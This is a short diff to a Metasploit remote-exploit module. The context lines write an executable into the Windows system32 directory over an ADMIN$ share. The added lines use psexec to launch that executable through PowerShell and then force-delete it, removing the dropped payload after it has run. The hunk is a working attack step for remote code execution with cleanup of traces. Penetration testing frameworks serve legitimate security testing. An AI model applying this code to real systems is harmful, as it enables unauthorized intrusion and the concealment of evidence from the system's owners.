@@ -145,6 +145,8 @@ class MetasploitModule < Msf::Exploit::Remote
     fd << exe
     fd.close
     print_status("Created %SystemRoot%\\system32\\#{filename}")
+	psexec("powershell  \"& \"\"C:\\Windows\\system32\\#{filename}\"\"\"")
+	psexec("del /f C:\\Windows\\system32\\#{filename}")
 
 
     # Disconnect from the ADMIN$
